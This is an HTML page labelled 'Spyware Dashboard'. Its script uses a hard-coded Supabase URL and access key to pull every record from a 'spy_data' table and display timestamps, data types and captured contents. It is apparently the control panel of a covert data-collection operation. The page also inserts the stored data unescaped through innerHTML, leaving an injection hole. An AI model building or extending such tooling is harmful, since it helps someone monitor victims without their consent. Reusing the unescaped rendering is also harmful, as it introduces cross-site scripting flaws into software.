<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Spyware Dashboard</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #111;
      color: #fff;
      padding: 20px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
    }
    th, td {
      border: 1px solid #555;
      padding: 10px;
      text-align: left;
    }
    th {
      background-color: #333;
    }
  </style>
</head>
<body>
  <h1>Spyware Dashboard</h1>
  <table id="data-table">
    <thead>
      <tr>
        <th>ID</th>
        <th>Timestamp</th>
        <th>Type</th>
        <th>Data</th>
      </tr>
    </thead>
    <tbody>
      <!-- Data will be inserted here -->
    </tbody>
  </table>

  <script>
    const supabaseUrl = 'https://muyevssqiuvhcozgxtlp.supabase.co';
    const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im11eWV2c3NxaXV2aGNvemd4dGxwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg0MTE4NTQsImV4cCI6MjA5Mzk4Nzg1NH0.jzN6V1UArKq5epxK3tTXuo1cGukH5oKD9qAi1FQWGUU';
    const supabase = supabase.createClient(supabaseUrl, supabaseKey);

    async function fetchData() {
      const { data, error } = await supabase
        .from('spy_data')
        .select('*');

      if (error) {
        console.error('Error fetching data:', error);
        return;
      }

      const tableBody = document.querySelector('#data-table tbody');
      tableBody.innerHTML = '';

      data.forEach(item => {
        const row = document.createElement('tr');
        row.innerHTML = `
          <td>${item.id}</td>
          <td>${new Date(item.timestamp).toLocaleString()}</td>
          <td>${item.type}</td>
          <td>${item.data}</td>
        `;
        tableBody.appendChild(row);
      });
    }

    fetchData();
  </script>
</body>
</html>
